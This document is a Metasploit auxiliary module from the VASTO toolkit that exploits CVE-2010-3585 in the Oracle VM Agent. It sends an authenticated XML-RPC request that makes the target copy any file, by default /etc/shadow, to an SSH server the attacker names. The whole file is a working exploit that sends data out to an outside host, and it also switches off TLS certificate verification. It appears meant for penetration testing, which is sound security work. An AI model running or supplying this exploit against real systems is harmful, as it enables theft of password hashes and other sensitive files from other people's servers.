#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = GoodRanking
	#Fixing invalid certificate complaints
	OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE if OpenSSL::SSL::VERIFY_PEER.nil?
	include Msf::Exploit::Remote::HttpClient
		
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle VM Agent remote code execution',
			'Description'    => %q{
					This module exploits a flaw in the Oracle VM Agent daemon which allows authenticated
					users to access any file on the file system and have the remote host copy them back
					through SSH. Address of the remote ssh host has to be provided. Tested up to OracleVM 2.2.1
			},
			'Author'      => ['Juan Pablo Perez Etchegoyen','Claudio Criscione'],
      			'References'	=>
				[
					[ 'URL', 'http://www.onapsis.com/resources/get.php?resid=adv_onapsis-2010-008' ],
					[ 'CVE', '2010-3585' ]
				],
			'License'        => GPL_LICENSE,
			'Version'        => '0.1',
			'DisclosureDate' => 'Nov 6 2010'))

		register_options(
			[
				Opt::RPORT(8899),
				OptString.new('password', [ true,  "Password to be used to login", 'orapass']),
				OptString.new('username', [ true,  "Username to be used to login", 'oracle']),
				OptString.new('ssh_username', [ true,  "Username of the SSH account", 'testu']),
				OptString.new('ssh_password', [ true,  "Password of the SSH account", 'testp']),
				OptString.new('ssh_host', [ true,  "SSH server to connect", '10.0.0.1']),
				OptString.new('ssh_filename', [ true,  "Filename on the SSH target", '/tmp/shadow']),
				OptString.new('file', [ true,  "Filename to retrieve", '/etc/shadow'])
			], self.class)
	end

	def run
	      rhost = datastore['RHOST']
	      user = datastore['username']
	      pass = datastore['password']
	      targetfile = datastore['file']
	      ssh_filename = datastore['ssh_filename']
	      ssh_host = datastore['ssh_host']
	      ssh_username = datastore['ssh_username']
	      ssh_userpass = datastore['ssh_password']
	      datastore['SSL'] = true

	      sploit = "<?xml version=\"1.0\"?><methodCall><methodName>utl_scp_vm</methodName><params>"+
			"<param><value><string>#{targetfile}</string></value></param>"+
			"<param><value><string>#{ssh_filename}</string></value></param> "+
			"<param><value><string>#{ssh_host}</string></value></param><param>"+ 
			"<value><string>#{ssh_username}</string></value></param><param> "+
			"<value><string>#{ssh_userpass}</string></value></param></params></methodCall>"

	      begin
		res = send_request_cgi({
		  'uri'     => '/RPC2',
		  'method'  => 'POST',
		  'data'    => sploit,
		  'basic_auth'=> "#{user}:#{pass}",
		  'headers' =>
		  {
			    'Content-Length'  =>  sploit.length,
			    'Content-Type'    => 'text/xml',
		  }
		}, -1)
	      if res.body =~/success/
		print_status("File exported")
	      else
		print_error("Error: file not exported. Dumping the error:")
		print_error(res.body)
	      end
	      
	      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => rex_exep
		  print_error "#{ rex_exep }"
	      rescue ::Timeout::Error, ::Errno::EPIPE => other
		  print_error "#{ other }"
	      end

	end

end
